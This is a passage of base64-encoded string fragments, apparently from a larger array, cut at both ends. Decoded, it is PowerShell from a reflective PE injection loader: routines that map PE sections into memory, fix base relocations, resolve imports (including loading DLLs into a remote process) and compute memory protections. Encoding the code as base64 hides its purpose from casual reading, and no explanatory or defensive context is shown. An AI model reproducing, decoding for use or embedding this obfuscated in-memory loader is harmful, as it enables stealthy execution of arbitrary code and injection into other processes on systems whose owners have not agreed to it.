1N0cmluZyAiQ29weS1TZWN0aW9uczo6TWFyc2hhbENvcHkiIC1QRUluZm8gJFBFSW5mbyAtU3RhcnRBZGRyZXNzICRTZWN0aW9uRGVzdEFkZHIgLVNpemUgJFNpemVPZlJhd0RhdGEgfCBPdXQtTnVsbAoJCQkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkUEVCeXRlcywgW0ludDMyXSRTZWN0aW9uSGVhZGVyLlBvaW50ZXJUb1Jhd0RhdGEsICRTZWN0aW9uRGVzdEFkZHIsICRTaXplT2ZSYXdEYXRhKQoJCQl9CgkJCgkJCSNJZiBTaXplT2ZSYXdEYXRhIGlzIGxlc3MgdGhhbiBWaXJ0dWFsU2l6ZSwgc2V0IG1lbW9yeSB0byAwIGZvciB0aGUgZXh0cmEgc3BhY2UKCQkJaWYgKCRTZWN0aW9uSGVhZGVyLlNpemVPZlJhd0RhdGEgLWx0ICRTZWN0aW9uSGVhZGVyLlZpcnR1YWxTaXplKQoJCQl7CgkJCQkkRGlmZmVyZW5jZSA9ICRTZWN0aW9uSGVhZGVyLlZpcnR1YWxTaXplIC0gJFNpemVPZlJhd0RhdGEKCQkJCVtJbnRQdHJdJFN0YXJ0QWRkcmVzcyA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFNlY3Rpb25EZXN0QWRkcikgKFtJbnQ2NF0kU2l6ZU9mUmF3RGF0YSkpCgkJCQlUZXN0LU1lbW9yeVJhbmdlVmFsaWQgLURlYnVnU3RyaW5nICJDb3B5LVNlY3Rpb25zOjpNZW1zZXQiIC1QRUluZm8gJFBFSW5mbyAtU3RhcnRBZGRyZXNzICRTdGFydEFkZHJlc3MgLVNpemUgJERpZmZlcmVuY2UgfCBPdXQtTnVsbAoJCQkJJFdpbjMyRnVuY3Rpb25zLm1lbXNldC5JbnZva2UoJFN0YXJ0QWRkcmVzcywgMCwgW0ludFB0cl0kRGlmZmVyZW5jZSkgfCBPdXQtTnVsbAoJCQl9CgkJfQoJfQoKCglGdW5jdGlvbiBVcGRhdGUtTWVtb3J5QWRkcmVzc2VzCgl7CgkJUGFyYW0oCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkUEVJbmZvLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludDY0XQoJCSRPcmlnaW5hbEltYWdlQmFzZSwKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMkNvbnN0YW50cywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMlR5cGVzCgkJKQoJCQoJCVtJbnQ2NF0kQmFzZURpZmZlcmVuY2UgPSAwCgkJJEFkZERpZmZlcmVuY2UgPSAkdHJ1ZSAjVHJhY2sgaWYgdGhlIGRpZmZlcmVuY2UgdmFyaWFibGUgc2hvdWxkIGJlIGFkZGVkIG9yIHN1YnRyYWN0ZWQgZnJvbSB2YXJpYWJsZXMKCQlbVUludDMyXSRJbWFnZUJhc2VSZWxvY1NpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfQkFTRV9SRUxPQ0FUSU9OKQoJCQoJCSNJZiB0aGUgUEUgd2FzIGxvYWRlZCB0byBpdHMgZXhwZWN0ZWQgYWRkcmVzcyBvciB0aGVyZSBhcmUgbm8gZW50cmllcyBpbiB0aGUgQmFzZVJlbG9jYXRpb25UYWJsZSwgbm90aGluZyB0byBkbwoJCWlmICgoJE9yaWdpbmFsSW1hZ2VCYXNlIC1lcSBbSW50NjRdJFBFSW5mby5FZmZlY3RpdmVQRUhhbmRsZSkgYAoJCQkJLW9yICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuQmFzZVJlbG9jYXRpb25UYWJsZS5TaXplIC1lcSAwKSkKCQl7CgkJCXJldHVybgoJCX0KCgoJCWVsc2VpZiAoKENvbXBhcmUtVmFsMUdyZWF0ZXJUaGFuVmFsMkFzVUludCAoJE9yaWdpbmFsSW1hZ2VCYXNlKSAoJFBFSW5mby5FZmZlY3RpdmVQRUhhbmRsZSkpIC1lcSAkdHJ1ZSkKCQl7CgkJCSRCYXNlRGlmZmVyZW5jZSA9IFN1Yi1TaWduZWRJbnRBc1Vuc2lnbmVkICgkT3JpZ2luYWxJbWFnZUJhc2UpICgkUEVJbmZvLkVmZmVjdGl2ZVBFSGFuZGxlKQoJCQkkQWRkRGlmZmVyZW5jZSA9ICRmYWxzZQoJCX0KCQllbHNlaWYgKChDb21wYXJlLVZhbDFHcmVhdGVyVGhhblZhbDJBc1VJbnQgKCRQRUluZm8uRWZmZWN0aXZlUEVIYW5kbGUpICgkT3JpZ2luYWxJbWFnZUJhc2UpKSAtZXEgJHRydWUpCgkJewoJCQkkQmFzZURpZmZlcmVuY2UgPSBTdWItU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSW5mby5FZmZlY3RpdmVQRUhhbmRsZSkgKCRPcmlnaW5hbEltYWdlQmFzZSkKCQl9CgkJCgkJI1VzZSB0aGUgSU1BR0VfQkFTRV9SRUxPQ0FUSU9OIHN0cnVjdHVyZSB0byBmaW5kIG1lbW9yeSBhZGRyZXNzZXMgd2hpY2ggbmVlZCB0byBiZSBtb2RpZmllZAoJCVtJbnRQdHJdJEJhc2VSZWxvY1B0ciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5QRUhhbmRsZSkgKFtJbnQ2NF0kUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuQmFzZVJlbG9jYXRpb25UYWJsZS5WaXJ0dWFsQWRkcmVzcykpCgkJd2hpbGUoJHRydWUpCgkJewoJCQkjSWYgU2l6ZU9mQmxvY2sgPT0gMCwgd2UgYXJlIGRvbmUKCQkJJEJhc2VSZWxvY2F0aW9uVGFibGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkQmFzZVJlbG9jUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9CQVNFX1JFTE9DQVRJT04pCgoJCQlpZiAoJEJhc2VSZWxvY2F0aW9uVGFibGUuU2l6ZU9mQmxvY2sgLWVxIDApCgkJCXsKCQkJCWJyZWFrCgkJCX0KCgkJCVtJbnRQdHJdJE1lbUFkZHJCYXNlID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlBFSGFuZGxlKSAoW0ludDY0XSRCYXNlUmVsb2NhdGlvblRhYmxlLlZpcnR1YWxBZGRyZXNzKSkKCQkJJE51bVJlbG9jYXRpb25zID0gKCRCYXNlUmVsb2NhdGlvblRhYmxlLlNpemVPZkJsb2NrIC0gJEltYWdlQmFzZVJlbG9jU2l6ZSkgLyAyCgoJCQkjTG9vcCB0aHJvdWdoIGVhY2ggcmVsb2NhdGlvbgoJCQlmb3IoJGkgPSAwOyAkaSAtbHQgJE51bVJlbG9jYXRpb25zOyAkaSsrKQoJCQl7CgkJCQkjR2V0IGluZm8gZm9yIHRoaXMgcmVsb2NhdGlvbgoJCQkJJFJlbG9jYXRpb25JbmZvUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnRQdHJdJEJhc2VSZWxvY1B0cikgKFtJbnQ2NF0kSW1hZ2VCYXNlUmVsb2NTaXplICsgKDIgKiAkaSkpKQoJCQkJW1VJbnQxNl0kUmVsb2NhdGlvbkluZm8gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkUmVsb2NhdGlvbkluZm9QdHIsIFtUeXBlXVtVSW50MTZdKQoKCQkJCSNGaXJzdCA0IGJpdHMgaXMgdGhlIHJlbG9jYXRpb24gdHlwZSwgbGFzdCAxMiBiaXRzIGlzIHRoZSBhZGRyZXNzIG9mZnNldCBmcm9tICRNZW1BZGRyQmFzZQoJCQkJW1VJbnQxNl0kUmVsb2NPZmZzZXQgPSAkUmVsb2NhdGlvbkluZm8gLWJhbmQgMHgwRkZGCgkJCQlbVUludDE2XSRSZWxvY1R5cGUgPSAkUmVsb2NhdGlvbkluZm8gLWJhbmQgMHhGMDAwCgkJCQlmb3IgKCRqID0gMDsgJGogLWx0IDEyOyAkaisrKQoJCQkJewoJCQkJCSRSZWxvY1R5cGUgPSBbTWF0aF06OkZsb29yKCRSZWxvY1R5cGUgLyAyKQoJCQkJfQoKCQkJCSNGb3IgRExMJ3MgdGhlcmUgYXJlIHR3byB0eXBlcyBvZiByZWxvY2F0aW9ucyB1c2VkIGFjY29yZGluZyB0byB0aGUgZm9sbG93aW5nIE1TRE4gYXJ0aWNsZS4gT25lIGZvciA2NGJpdCBhbmQgb25lIGZvciAzMmJpdC4KCQkJCSNUaGlzIGFwcGVhcnMgdG8gYmUgdHJ1ZSBmb3IgRVhFJ3MgYXMgd2VsbC4KCQkJCSMJU2l0ZTogaHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9tYWdhemluZS9jYzMwMTgwOC5hc3B4CgkJCQlpZiAoKCRSZWxvY1R5cGUgLWVxICRXaW4zMkNvbnN0YW50cy5JTUFHRV9SRUxfQkFTRURfSElHSExPVykgYAoJCQkJCQktb3IgKCRSZWxvY1R5cGUgLWVxICRXaW4zMkNvbnN0YW50cy5JTUFHRV9SRUxfQkFTRURfRElSNjQpKQoJCQkJewkJCQoJCQkJCSNHZXQgdGhlIGN1cnJlbnQgbWVtb3J5IGFkZHJlc3MgYW5kIHVwZGF0ZSBpdCBiYXNlZCBvZmYgdGhlIGRpZmZlcmVuY2UgYmV0d2VlbiBQRSBleHBlY3RlZCBiYXNlIGFkZHJlc3MgYW5kIGFjdHVhbCBiYXNlIGFkZHJlc3MKCQkJCQlbSW50UHRyXSRGaW5hbEFkZHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRNZW1BZGRyQmFzZSkgKFtJbnQ2NF0kUmVsb2NPZmZzZXQpKQoJCQkJCVtJbnRQdHJdJEN1cnJBZGRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEZpbmFsQWRkciwgW1R5cGVdW0ludFB0cl0pCgkJCgkJCQkJaWYgKCRBZGREaWZmZXJlbmNlIC1lcSAkdHJ1ZSkKCQkJCQl7CgkJCQkJCVtJbnRQdHJdJEN1cnJBZGRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kQ3VyckFkZHIpICgkQmFzZURpZmZlcmVuY2UpKQoJCQkJCX0KCQkJCQllbHNlCgkJCQkJewoJCQkJCQlbSW50UHRyXSRDdXJyQWRkciA9IFtJbnRQdHJdKFN1Yi1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJEN1cnJBZGRyKSAoJEJhc2VEaWZmZXJlbmNlKSkKCQkJCQl9CQkJCQoKCQkJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkQ3VyckFkZHIsICRGaW5hbEFkZHIsICRmYWxzZSkgfCBPdXQtTnVsbAoJCQkJfQoJCQkJZWxzZWlmICgkUmVsb2NUeXBlIC1uZSAkV2luMzJDb25zdGFudHMuSU1BR0VfUkVMX0JBU0VEX0FCU09MVVRFKQoJCQkJewoJCQkJCSNJTUFHRV9SRUxfQkFTRURfQUJTT0xVVEUgaXMganVzdCB1c2VkIGZvciBwYWRkaW5nLCB3ZSBkb24ndCBhY3R1YWxseSBkbyBhbnl0aGluZyB3aXRoIGl0CgkJCQkJVGhyb3cgIlVua25vd24gcmVsb2NhdGlvbiBmb3VuZCwgcmVsb2NhdGlvbiB2YWx1ZTogJFJlbG9jVHlwZSwgcmVs",
		"b2NhdGlvbmluZm86ICRSZWxvY2F0aW9uSW5mbyIKCQkJCX0KCQkJfQoJCQkKCQkJJEJhc2VSZWxvY1B0ciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJEJhc2VSZWxvY1B0cikgKFtJbnQ2NF0kQmFzZVJlbG9jYXRpb25UYWJsZS5TaXplT2ZCbG9jaykpCgkJfQoJfQoKCglGdW5jdGlvbiBJbXBvcnQtRGxsSW1wb3J0cwoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW1N5c3RlbS5PYmplY3RdCgkJJFBFSW5mbywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMkZ1bmN0aW9ucywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMlR5cGVzLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW1N5c3RlbS5PYmplY3RdCgkJJFdpbjMyQ29uc3RhbnRzLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0LCBNYW5kYXRvcnkgPSAkZmFsc2UpXQoJCVtJbnRQdHJdCgkJJFJlbW90ZVByb2NIYW5kbGUKCQkpCgkJCgkJJFJlbW90ZUxvYWRpbmcgPSAkZmFsc2UKCQlpZiAoJFBFSW5mby5QRUhhbmRsZSAtbmUgJFBFSW5mby5FZmZlY3RpdmVQRUhhbmRsZSkKCQl7CgkJCSRSZW1vdGVMb2FkaW5nID0gJHRydWUKCQl9CgkJCgkJaWYgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5JbXBvcnRUYWJsZS5TaXplIC1ndCAwKQoJCXsKCQkJW0ludFB0cl0kSW1wb3J0RGVzY3JpcHRvclB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5QRUhhbmRsZSkgKFtJbnQ2NF0kUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuSW1wb3J0VGFibGUuVmlydHVhbEFkZHJlc3MpCgkJCQoJCQl3aGlsZSAoJHRydWUpCgkJCXsKCQkJCSRJbXBvcnREZXNjcmlwdG9yID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEltcG9ydERlc2NyaXB0b3JQdHIsIFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX0lNUE9SVF9ERVNDUklQVE9SKQoJCQkJCgkJCQkjSWYgdGhlIHN0cnVjdHVyZSBpcyBudWxsLCBpdCBzaWduYWxzIHRoYXQgdGhpcyBpcyB0aGUgZW5kIG9mIHRoZSBhcnJheQoJCQkJaWYgKCRJbXBvcnREZXNjcmlwdG9yLkNoYXJhY3RlcmlzdGljcyAtZXEgMCBgCgkJCQkJCS1hbmQgJEltcG9ydERlc2NyaXB0b3IuRmlyc3RUaHVuayAtZXEgMCBgCgkJCQkJCS1hbmQgJEltcG9ydERlc2NyaXB0b3IuRm9yd2FyZGVyQ2hhaW4gLWVxIDAgYAoJCQkJCQktYW5kICRJbXBvcnREZXNjcmlwdG9yLk5hbWUgLWVxIDAgYAoJCQkJCQktYW5kICRJbXBvcnREZXNjcmlwdG9yLlRpbWVEYXRlU3RhbXAgLWVxIDApCgkJCQl7CgkJCQkJV3JpdGUtVmVyYm9zZSAiRG9uZSBpbXBvcnRpbmcgRExMIGltcG9ydHMiCgkJCQkJYnJlYWsKCQkJCX0KCgkJCQkkSW1wb3J0RGxsSGFuZGxlID0gW0ludFB0cl06Olplcm8KCQkJCSRJbXBvcnREbGxQYXRoUHRyID0gKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5QRUhhbmRsZSkgKFtJbnQ2NF0kSW1wb3J0RGVzY3JpcHRvci5OYW1lKSkKCQkJCSRJbXBvcnREbGxQYXRoID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKCRJbXBvcnREbGxQYXRoUHRyKQoJCQkJCgkJCQlpZiAoJFJlbW90ZUxvYWRpbmcgLWVxICR0cnVlKQoJCQkJewoJCQkJCSRJbXBvcnREbGxIYW5kbGUgPSBJbXBvcnQtRGxsSW5SZW1vdGVQcm9jZXNzIC1SZW1vdGVQcm9jSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1JbXBvcnREbGxQYXRoUHRyICRJbXBvcnREbGxQYXRoUHRyCgkJCQl9CgkJCQllbHNlCgkJCQl7CgkJCQkJJEltcG9ydERsbEhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5Mb2FkTGlicmFyeS5JbnZva2UoJEltcG9ydERsbFBhdGgpCgkJCQl9CgoJCQkJaWYgKCgkSW1wb3J0RGxsSGFuZGxlIC1lcSAkbnVsbCkgLW9yICgkSW1wb3J0RGxsSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykpCgkJCQl7CgkJCQkJdGhyb3cgIkVycm9yIGltcG9ydGluZyBETEwsIERMTE5hbWU6ICRJbXBvcnREbGxQYXRoIgoJCQkJfQoJCQkJCgkJCQkjR2V0IHRoZSBmaXJzdCB0aHVuaywgdGhlbiBsb29wIHRocm91Z2ggYWxsIG9mIHRoZW0KCQkJCVtJbnRQdHJdJFRodW5rUmVmID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUluZm8uUEVIYW5kbGUpICgkSW1wb3J0RGVzY3JpcHRvci5GaXJzdFRodW5rKQoJCQkJW0ludFB0cl0kT3JpZ2luYWxUaHVua1JlZiA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJEltcG9ydERlc2NyaXB0b3IuQ2hhcmFjdGVyaXN0aWNzKSAjQ2hhcmFjdGVyaXN0aWNzIGlzIG92ZXJsb2FkZWQgd2l0aCBPcmlnaW5hbEZpcnN0VGh1bmsKCQkJCVtJbnRQdHJdJE9yaWdpbmFsVGh1bmtSZWZWYWwgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkT3JpZ2luYWxUaHVua1JlZiwgW1R5cGVdW0ludFB0cl0pCgkJCQkKCQkJCXdoaWxlICgkT3JpZ2luYWxUaHVua1JlZlZhbCAtbmUgW0ludFB0cl06Olplcm8pCgkJCQl7CiAgICAgICAgICAgICAgICAgICAgJExvYWRCeU9yZGluYWwgPSAkZmFsc2UKICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSRQcm9jZWR1cmVOYW1lUHRyID0gW0ludFB0cl06Olplcm8KCQkJCQkjQ29tcGFyZSB0aHVua1JlZlZhbCB0byBJTUFHRV9PUkRJTkFMX0ZMQUcsIHdoaWNoIGlzIGRlZmluZWQgYXMgMHg4MDAwMDAwMCBvciAweDgwMDAwMDAwMDAwMDAwMDAgZGVwZW5kaW5nIG9uIDMyYml0IG9yIDY0Yml0CgkJCQkJIwlJZiB0aGUgdG9wIGJpdCBpcyBzZXQgb24gYW4gaW50LCBpdCB3aWxsIGJlIG5lZ2F0aXZlLCBzbyBpbnN0ZWFkIG9mIHdvcnJ5aW5nIGFib3V0IGNhc3RpbmcgdGhpcyB0byB1aW50CgkJCQkJIwlhbmQgZG9pbmcgdGhlIGNvbXBhcmlzb24sIGp1c3Qgc2VlIGlmIGl0IGlzIGxlc3MgdGhhbiAwCgkJCQkJW0ludFB0cl0kTmV3VGh1bmtSZWYgPSBbSW50UHRyXTo6WmVybwoJCQkJCWlmKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkgLWVxIDQgLWFuZCBbSW50MzJdJE9yaWdpbmFsVGh1bmtSZWZWYWwgLWx0IDApCgkJCQkJewoJCQkJCQlbSW50UHRyXSRQcm9jZWR1cmVOYW1lUHRyID0gW0ludFB0cl0kT3JpZ2luYWxUaHVua1JlZlZhbCAtYmFuZCAweGZmZmYgI1RoaXMgaXMgYWN0dWFsbHkgYSBsb29rdXAgYnkgb3JkaW5hbAogICAgICAgICAgICAgICAgICAgICAgICAkTG9hZEJ5T3JkaW5hbCA9ICR0cnVlCgkJCQkJfQogICAgICAgICAgICAgICAgICAgIGVsc2VpZihbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW0ludFB0cl0pIC1lcSA4IC1hbmQgW0ludDY0XSRPcmlnaW5hbFRodW5rUmVmVmFsIC1sdCAwKQoJCQkJCXsKCQkJCQkJW0ludFB0cl0kUHJvY2VkdXJlTmFtZVB0ciA9IFtJbnQ2NF0kT3JpZ2luYWxUaHVua1JlZlZhbCAtYmFuZCAweGZmZmYgI1RoaXMgaXMgYWN0dWFsbHkgYSBsb29rdXAgYnkgb3JkaW5hbAogICAgICAgICAgICAgICAgICAgICAgICAkTG9hZEJ5T3JkaW5hbCA9ICR0cnVlCgkJCQkJfQoJCQkJCWVsc2UKCQkJCQl7CgkJCQkJCVtJbnRQdHJdJFN0cmluZ0FkZHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSW5mby5QRUhhbmRsZSkgKCRPcmlnaW5hbFRodW5rUmVmVmFsKQoJCQkJCQkkU3RyaW5nQWRkciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTdHJpbmdBZGRyIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW1VJbnQxNl0pKQoJCQkJCQkkUHJvY2VkdXJlTmFtZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nQW5zaSgkU3RyaW5nQWRkcikKICAgICAgICAgICAgICAgICAgICAgICAgJFByb2NlZHVyZU5hbWVQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJpbmdUb0hHbG9iYWxBbnNpKCRQcm9jZWR1cmVOYW1lKQoJCQkJCX0KCQkJCQkKCQkJCQlpZiAoJFJlbW90ZUxvYWRpbmcgLWVxICR0cnVlKQoJCQkJCXsKCQkJCQkJW0ludFB0cl0kTmV3VGh1bmtSZWYgPSBHZXQtUmVtb3RlUHJvY0FkZHJlc3MgLVJlbW90ZVByb2NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLVJlbW90ZURsbEhhbmRsZSAkSW1wb3J0RGxsSGFuZGxlIC1GdW5jdGlvbk5hbWVQdHIgJFByb2NlZHVyZU5hbWVQdHIgLUxvYWRCeU9yZGluYWwgJExvYWRCeU9yZGluYWwKCQkJCQl9CgkJCQkJZWxzZQoJCQkJCXsKCQkJCSAgICAgICAgW0ludFB0cl0kTmV3VGh1bmtSZWYgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3NJbnRQdHIuSW52b2tlKCRJbXBvcnREbGxIYW5kbGUsICRQcm9jZWR1cmVOYW1lUHRyKQoJCQkJCX0KCQkJCQkKCQkJCQlpZiAoJE5ld1RodW5rUmVmIC1lcSAkbnVsbCAtb3IgJE5ld1RodW5rUmVmIC1lcSBbSW50UHRyXTo6WmVybykKCQkJCQl7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkTG9hZEJ5T3JkaW5hbCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGhyb3cgIk5ldyBmdW5jdGlvbiByZWZlcmVuY2UgaXMgbnVsbCwgdGhpcyBpcyBhbG1vc3QgY2VydGFpbmx5IGEgYnVnIGluIHRoaXMgc2NyaXB0LiBGdW5jdGlvbiBPcmRpbmFsOiAkUHJvY2VkdXJlTmFtZVB0ci4gRGxsOiAkSW1wb3J0RGxsUGF0aCIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHsKCQkJCQkJICAgIFRocm93ICJOZXcgZnVuY3Rpb24gcmVmZXJlbmNlIGlzIG51bGwsIHRoaXMgaXMgYWxtb3N0IGNlcnRhaW5seSBhIGJ1ZyBpbiB0aGlzIHNjcmlwdC4gRnVuY3Rpb246ICRQcm9jZWR1cmVOYW1lLiBEbGw6ICRJbXBvcnREbGxQYXRoIgogICAgICAgICAgICAgICAgICAgICAgICB9CgkJCQkJfQoKCQkJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkTmV3VGh1bmtSZWYsICRUaHVua1JlZiwgJGZhbHNlKQoJCQkJCQoJCQkJCSRUaHVua1JlZiA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFRodW5rUmVmKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSkKCQkJCQlbSW50UHRyXSRPcmlnaW5hbFRodW5rUmVmID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kT3JpZ2luYWxUaHVua1JlZikgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkpCgkJCQkJW0ludFB0cl0kT3JpZ2luYWxUaHVua1JlZlZhbCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRPcmlnaW5hbFRodW5rUmVmLCBbVHlwZV1bSW50UHRyXSkKCiAgICAgICAgICAgICAgICAgICAgI0NsZWFudXAKICAgICAgICAgICAgICAgICAgICAjSWYgbG9hZGluZyBieSBvcmRpbmFsLCBQcm9jZWR1cmVOYW1lUHRyIGlzIHRoZSBvcmRpbmFsIHZhbHVlIGFuZCBub3QgYWN0dWFsbHkgYSBwb2ludGVyIHRvIGEgYnVmZmVyIHRoYXQgbmVlZHMgdG8gYmUgZnJlZWQKICAgICAgICAgICAgICAgICAgICBpZiAoKC1ub3QgJExvYWRCeU9yZGluYWwpIC1hbmQgKCRQcm9jZWR1cmVOYW1lUHRyIC1uZSBbSW50UHRyXTo6WmVybykpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkUHJvY2VkdXJlTmFtZVB0cikKICAgICAgICAgICAgICAgICAgICAgICAgJFByb2NlZHVyZU5hbWVQdHIgPSBbSW50",
		"UHRyXTo6WmVybwogICAgICAgICAgICAgICAgICAgIH0KCQkJCX0KCQkJCQoJCQkJJEltcG9ydERlc2NyaXB0b3JQdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJEltcG9ydERlc2NyaXB0b3JQdHIpIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IpKQoJCQl9CgkJfQoJfQoKCUZ1bmN0aW9uIEdldC1WaXJ0dWFsUHJvdGVjdFZhbHVlCgl7CgkJUGFyYW0oCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbVUludDMyXQoJCSRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzCgkJKQoJCQoJCSRQcm90ZWN0aW9uRmxhZyA9IDB4MAoJCWlmICgoJFNlY3Rpb25DaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1NDTl9NRU1fRVhFQ1VURSkgLWd0IDApCgkJewoJCQlpZiAoKCRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9TQ05fTUVNX1JFQUQpIC1ndCAwKQoJCQl7CgkJCQlpZiAoKCRT